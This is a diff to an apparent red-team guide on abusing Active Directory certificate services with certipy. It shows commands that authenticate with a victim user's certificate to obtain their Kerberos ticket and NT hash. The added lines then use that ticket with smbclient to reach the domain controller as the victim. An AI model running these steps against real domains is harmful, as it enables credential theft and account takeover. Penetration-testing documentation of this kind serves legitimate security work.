@@ -77,6 +77,9 @@ The following example uses the tool certipy to request a certificate of a victim
 Once you have the pfx file for the user, authenticate to get the Kerberos ticket (ccache file) and NT hash of the victim user:   
 `proxychains certipy auth -pfx victimuser.pfx -dc-ip 10.0.0.1`   
 
+To test the received krb ticket for the user, you can e.g. try to connect to the DC using smbclient:   
+`smbclient.py -k domain.local/victimuser@dc01.domain.local -no-pass `   
+
 **Some Notes**   
  - The target of the certipy req command must be the CA, not the DC!
  - The CA name has to be the exact same as in the output of e.g. certipy find command. If it contains spaces, use quotes. 
